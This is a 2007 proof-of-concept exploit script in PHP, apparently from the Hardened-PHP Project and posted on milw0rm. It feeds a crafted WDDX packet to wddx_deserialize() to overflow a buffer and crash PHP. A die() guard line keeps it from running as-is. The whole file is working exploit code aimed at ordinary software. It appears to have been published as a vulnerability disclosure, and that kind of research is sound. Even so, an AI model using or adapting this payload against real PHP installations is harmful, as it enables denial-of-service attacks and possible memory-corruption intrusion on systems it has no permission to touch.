<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //                PHP - wddx_deserialize() Crash Exploit              //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  // The following testcode will overflow the buffer with lots of C

  wddx_deserialize(
    "<wddxPacket version='1.0'><header/>
        <data>
            <array length='1'>
                <string>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<X />CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</string>
                <string></string>
            </array>
        </data>
    </wddxPacket>");
?>

# milw0rm.com [2007-03-04]
